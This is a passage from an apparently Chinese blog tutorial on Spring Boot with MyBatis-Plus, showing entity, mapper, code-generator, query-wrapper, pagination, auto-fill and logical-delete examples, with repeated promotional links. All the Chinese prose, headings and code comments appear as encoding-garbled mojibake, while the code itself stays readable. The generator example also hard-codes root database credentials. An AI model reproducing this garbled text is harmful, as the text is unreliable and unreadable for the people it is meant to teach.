#f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ã€Šèƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼ã€‹</h2>
<blockquote>
<p>æˆ‘æ˜¯å°åï¼Œä»Šå¤©å’±ä»¬èŠç‚¹å®åœ¨çš„ã€‚ä½ è¿˜åœ¨æ‰‹å†™å¢åˆ æ”¹æŸ¥å—ï¼Ÿè¿˜åœ¨å†™é‚£äº›é‡å¤çš„Mapper XMLå—ï¼Ÿè¿˜åœ¨ä¸ºåˆ†é¡µå¤´ç–¼å—ï¼Ÿè¯•è¯•MyBatis-Plusï¼Œè®©ä½ å°‘å†™80%çš„ä»£ç ï¼</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å¼€å‘è€…çš„çœŸå®ç—›ç‚¹</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<p><strong>çœ‹çœ‹è¿™äº›åœºæ™¯ä½ ç†Ÿä¸ç†Ÿ</strong>ï¼š</p>
<p><strong>åœºæ™¯1</strong>ï¼šæ–°é¡¹ç›®å¼€å§‹ï¼Œå»ºè¡¨ã€å»ºå®ä½“ã€å»ºMapperã€å»ºServiceã€å»ºController...ä¸€å¥—ä¸‹æ¥å‡ åä¸ªæ–‡ä»¶ã€‚</p>
<p><strong>åœºæ™¯2</strong>ï¼šå†™ä¸ªæ¡ä»¶æŸ¥è¯¢ï¼ŒXMLé‡Œå†™ä¸€å †ifæ ‡ç­¾ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"findUsers"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"User"</span>&gt;</span>
    SELECT * FROM user WHERE 1=1
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"name != null"</span>&gt;</span>AND name like #{name}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"age != null"</span>&gt;</span>AND age = #{age}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"status != null"</span>&gt;</span>AND status = #{status}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
<p><strong>åœºæ™¯3</strong>ï¼šåˆ†é¡µæŸ¥è¯¢ï¼Œæ¯å†™ä¸€æ¬¡éƒ½è¦ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰‹å†™åˆ†é¡µSQL</span>
<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT * FROM user LIMIT "</span> + (page-<span class="hljs-number">1</span>)*size + <span class="hljs-string">","</span> + size;
<span class="hljs-comment">// å†æŸ¥æ€»æ•°</span>
<span class="hljs-type">String</span> <span class="hljs-variable">countSql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT COUNT(*) FROM user"</span>;
</code></pre>
<p><strong>ç”¨MyBatis-Plusèƒ½è§£å†³å•¥</strong>ï¼š</p>
<ul>
<li>è‡ªåŠ¨ç”ŸæˆåŸºç¡€ä»£ç </li>
<li>æ¡ä»¶æŸ¥è¯¢ä¸ç”¨å†™XML</li>
<li>åˆ†é¡µä¸€è¡Œä»£ç æå®š</li>
<li>å†…ç½®é€»è¾‘åˆ é™¤ã€å­—æ®µå¡«å……</li>
<li>æ”¯æŒå¤šç§Ÿæˆ·æ•°æ®éš”ç¦»</li>
</ul>
<h3 data-id="heading-2">äºŒã€3åˆ†é’Ÿå¿«é€Ÿä¸Šæ‰‹</h3>
<h4 data-id="heading-3">2.1 åŠ ä¸ªä¾èµ–</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">2.2 å†™ä¸ªé…ç½®</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span>  <span class="hljs-comment"># æ‰“å°SQLæ—¥å¿—</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">logic-delete-field:</span> <span class="hljs-string">deleted</span>  <span class="hljs-comment"># å…¨å±€é€»è¾‘åˆ é™¤å­—æ®µå</span>
      <span class="hljs-attr">logic-delete-value:</span> <span class="hljs-number">1</span>        <span class="hljs-comment"># é€»è¾‘å·²åˆ é™¤å€¼</span>
      <span class="hljs-attr">logic-not-delete-value:</span> <span class="hljs-number">0</span>    <span class="hljs-comment"># é€»è¾‘æœªåˆ é™¤å€¼</span>
</code></pre>
<h4 data-id="heading-5">2.3 å®šä¹‰å®ä½“</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@TableName("user")</span>  <span class="hljs-comment">// æŒ‡å®šè¡¨å</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@TableId(type = IdType.AUTO)</span>  <span class="hljs-comment">// ä¸»é”®è‡ªå¢</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> Integer age;
    <span class="hljs-keyword">private</span> String email;
    
    <span class="hljs-meta">@TableLogic</span>  <span class="hljs-comment">// é€»è¾‘åˆ é™¤å­—æ®µ</span>
    <span class="hljs-keyword">private</span> Integer deleted;
    
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT)</span>  <span class="hljs-comment">// æ’å…¥æ—¶è‡ªåŠ¨å¡«å……</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
    
    <span class="hljs-meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span>  <span class="hljs-comment">// æ’å…¥å’Œæ›´æ–°æ—¶å¡«å……</span>
    <span class="hljs-keyword">private</span> LocalDateTime updateTime;
}
</code></pre>
<h4 data-id="heading-6">2.4 å†™ä¸ªMapperï¼ˆæœ€ç®€å•ç‰ˆï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;User&gt; {
    <span class="hljs-comment">// ç»§æ‰¿BaseMapperå°±æœ‰äº†æ‰€æœ‰åŸºç¡€CRUDæ–¹æ³•</span>
    <span class="hljs-comment">// ä¸ç”¨å†™XMLï¼Œä¸ç”¨å†™SQL</span>
}
</code></pre>
<h4 data-id="heading-7">2.5 é©¬ä¸Šå°±èƒ½ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;
    
    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-comment">// ç›´æ¥æŸ¥è¯¢</span>
        <span class="hljs-keyword">return</span> userMapper.selectById(id);
    }
    
    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span> {
        <span class="hljs-comment">// ç›´æ¥æ’å…¥</span>
        userMapper.insert(user);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ·»åŠ æˆåŠŸ"</span>;
    }
}
</code></pre>
<h3 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒåŠŸèƒ½ï¼šè§£æ”¾ç”Ÿäº§åŠ›</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-9">3.1 ä»£ç ç”Ÿæˆå™¨ï¼ˆæ•ˆç‡æå‡80%ï¼‰</h4>
<p><strong>ä»¥å‰</strong>ï¼šæ‰‹åŠ¨åˆ›å»ºå®ä½“ã€Mapperã€Serviceã€Controller
<strong>ç°åœ¨</strong>ï¼šä¸€é”®ç”Ÿæˆæ‰€æœ‰æ–‡ä»¶</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AutoGenerator</span> <span class="hljs-variable">generator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AutoGenerator</span>();
        
        <span class="hljs-comment">// æ•°æ®åº“é…ç½®</span>
        <span class="hljs-type">DataSourceConfig</span> <span class="hljs-variable">dataSourceConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceConfig</span>();
        dataSourceConfig.setUrl(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
        dataSourceConfig.setUsername(<span class="hljs-string">"root"</span>);
        dataSourceConfig.setPassword(<span class="hljs-string">"123456"</span>);
        generator.setDataSource(dataSourceConfig);
        
        <span class="hljs-comment">// å…¨å±€é…ç½®</span>
        <span class="hljs-type">GlobalConfig</span> <span class="hljs-variable">globalConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalConfig</span>();
        globalConfig.setOutputDir(System.getProperty(<span class="hljs-string">"user.dir"</span>) + <span class="hljs-string">"/src/main/java"</span>);
        globalConfig.setAuthor(<span class="hljs-string">"å°å"</span>);
        globalConfig.setOpen(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// ç”Ÿæˆåä¸æ‰“å¼€æ–‡ä»¶å¤¹</span>
        generator.setGlobalConfig(globalConfig);
        
        <span class="hljs-comment">// åŒ…é…ç½®</span>
        <span class="hljs-type">PackageConfig</span> <span class="hljs-variable">packageConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageConfig</span>();
        packageConfig.setParent(<span class="hljs-string">"com.example.demo"</span>);
        packageConfig.setEntity(<span class="hljs-string">"entity"</span>);
        packageConfig.setMapper(<span class="hljs-string">"mapper"</span>);
        packageConfig.setService(<span class="hljs-string">"service"</span>);
        packageConfig.setController(<span class="hljs-string">"controller"</span>);
        generator.setPackageInfo(packageConfig);
        
        <span class="hljs-comment">// ç­–ç•¥é…ç½®</span>
        <span class="hljs-type">StrategyConfig</span> <span class="hljs-variable">strategy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StrategyConfig</span>();
        strategy.setInclude(<span class="hljs-string">"user"</span>, <span class="hljs-string">"order"</span>, <span class="hljs-string">"product"</span>);  <span class="hljs-comment">// è¦ç”Ÿæˆçš„è¡¨</span>
        strategy.setNaming(NamingStrategy.underline_to_camel);  <span class="hljs-comment">// ä¸‹åˆ’çº¿è½¬é©¼å³°</span>
        strategy.setColumnNaming(NamingStrategy.underline_to_camel);
        strategy.setEntityLombokModel(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// ä½¿ç”¨Lombok</span>
        strategy.setRestControllerStyle(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// RESTé£æ ¼Controller</span>
        generator.setStrategy(strategy);
        
        <span class="hljs-comment">// æ‰§è¡Œç”Ÿæˆ</span>
        generator.execute();
    }
}
</code></pre>
<p><strong>è¿è¡Œåç”Ÿæˆ</strong>ï¼š</p>
<ul>
<li>User.javaï¼ˆå®ä½“ç±»ï¼‰</li>
<li>UserMapper.javaï¼ˆMapperæ¥å£ï¼‰</li>
<li>UserService.javaï¼ˆServiceæ¥å£ï¼‰</li>
<li>UserServiceImpl.javaï¼ˆServiceå®ç°ï¼‰</li>
<li>UserController.javaï¼ˆControllerï¼‰</li>
</ul>
<h4 data-id="heading-10">3.2 æ¡ä»¶æ„é€ å™¨ï¼ˆå‘Šåˆ«XMLï¼‰</h4>
<p><strong>ä»¥å‰</strong>ï¼šå†™ä¸€å †ifæ ‡ç­¾çš„XML
<strong>ç°åœ¨</strong>ï¼šé“¾å¼è°ƒç”¨ï¼Œå¯è¯»æ€§å¼º</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;
    
    <span class="hljs-comment">// å¤æ‚æ¡ä»¶æŸ¥è¯¢</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findUsers</span><span class="hljs-params">(String name, Integer minAge, Integer maxAge, Integer status)</span> {
        QueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
        
        <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(name)) {
            wrapper.like(<span class="hljs-string">"name"</span>, name);  <span class="hljs-comment">// name like '%?%'</span>
        }
        <span class="hljs-keyword">if</span> (minAge != <span class="hljs-literal">null</span>) {
            wrapper.ge(<span class="hljs-string">"age"</span>, minAge);  <span class="hljs-comment">// age &gt;= ?</span>
        }
        <span class="hljs-keyword">if</span> (maxAge != <span class="hljs-literal">null</span>) {
            wrapper.le(<span class="hljs-string">"age"</span>, maxAge);  <span class="hljs-comment">// age &lt;= ?</span>
        }
        <span class="hljs-keyword">if</span> (status != <span class="hljs-literal">null</span>) {
            wrapper.eq(<span class="hljs-string">"status"</span>, status);  <span class="hljs-comment">// status = ?</span>
        }
        
        wrapper.orderByDesc(<span class="hljs-string">"create_time"</span>);
        <span class="hljs-keyword">return</span> userMapper.selectList(wrapper);
    }
    
    <span class="hljs-comment">// æ›´ç®€æ´çš„Lambdaå†™æ³•ï¼ˆæ¨èï¼‰</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findUsersLambda</span><span class="hljs-params">(String name, Integer age)</span> {
        LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        
        wrapper.like(StringUtils.isNotBlank(name), User::getName, name)
               .eq(age != <span class="hljs-literal">null</span>, User::getAge, age)
               .orderByDesc(User::getCreateTime);
        
        <span class="hljs-keyword">return</span> userMapper.selectList(wrapper);
    }
}
</code></pre>
<h4 data-id="heading-11">3.3 åˆ†é¡µæ’ä»¶ï¼ˆä¸€è¡Œä»£ç æå®šï¼‰</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        <span class="hljs-comment">// åˆ†é¡µæ’ä»¶</span>
        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>(DbType.MYSQL));
        <span class="hljs-keyword">return</span> interceptor;
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-keyword">public</span> Page&lt;User&gt; <span class="hljs-title function_">getUsersByPage</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize, String keyword)</span> {
        Page&lt;User&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(pageNum, pageSize);
        
        LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.like(StringUtils.isNotBlank(keyword), User::getName, keyword);
        
        <span class="hljs-keyword">return</span> userMapper.selectPage(page, wrapper);
    }
}
</code></pre>
<h4 data-id="heading-12">3.4 è‡ªåŠ¨å¡«å……ï¼ˆå‡å°‘é‡å¤ä»£ç ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMetaObjectHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MetaObjectHandler</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertFill</span><span class="hljs-params">(MetaObject metaObject)</span> {
        <span class="hljs-comment">// æ’å…¥æ—¶è‡ªåŠ¨å¡«å……</span>
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"createTime"</span>, LocalDateTime.class, LocalDateTime.now());
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"updateTime"</span>, LocalDateTime.class, LocalDateTime.now());
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"createBy"</span>, String.class, getCurrentUsername());
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFill</span><span class="hljs-params">(MetaObject metaObject)</span> {
        <span class="hljs-comment">// æ›´æ–°æ—¶è‡ªåŠ¨å¡«å……</span>
        <span class="hljs-built_in">this</span>.strictUpdateFill(metaObject, <span class="hljs-string">"updateTime"</span>, LocalDateTime.class, LocalDateTime.now());
        <span class="hljs-built_in">this</span>.strictUpdateFill(metaObject, <span class="hljs-string">"updateBy"</span>, String.class, getCurrentUsername());
    }
}
</code></pre>
<h4 data-id="heading-13">3.5 é€»è¾‘åˆ é™¤ï¼ˆæ•°æ®ä¸çœŸåˆ ï¼‰</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®ä½“ç±»å­—æ®µåŠ ä¸Šæ³¨è§£</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> Integer deleted;

<span class="hljs-comment">// ä½¿ç”¨æ—¶è‡ªåŠ¨è¿‡æ»¤å·²åˆ é™¤æ•°æ®</span>
List&lt;User&gt; users = userMapper.selectList(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// åªæŸ¥ deleted=0 çš„æ•°æ®</span>

<span class="hljs-comment">// åˆ é™¤å˜æˆæ›´æ–°</span>
userMapper.deleteById(<span class="hljs-number">1L</span>);  <span class="hljs-comment">// å®é™…ä¸Šæ‰§è¡Œï¼šUPDATE user SET deleted=1 WHERE id=1</span>

<span class="hljs-comment">// æƒ³æŸ¥è¢«åˆ é™¤çš„æ•°æ®</span>
QueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
wrapper.eq(<span class="hljs-string">"deleted"</span>, <span class="hljs-number">1</span>);
List&lt;User&gt; deletedUsers = userMapper.selectList(wrapper);
</code></pre>
<h3 data-id="heading-14">å››ã€é«˜çº§åŠŸèƒ½ï¼šè§£å†³ä¸šåŠ¡ç—›ç‚¹</h3>
<h4 data-id="heading-15">4.1 å¤šç§Ÿæˆ·æ•°æ®éš”ç¦»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        
        <span class="hljs-comment">// å¤šç§Ÿæˆ·æ’ä»¶</span>
        <span class="hljs-type">TenantLineInnerInterceptor</span> <span class="hljs-variable">tenantInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TenantLineInnerInterceptor</span>();
        tenantInterceptor.setTenantLineHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TenantLineHandler</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> Expression <span class="hljs-title function_">getTenantId</span><span class="hljs-params">()</span> {
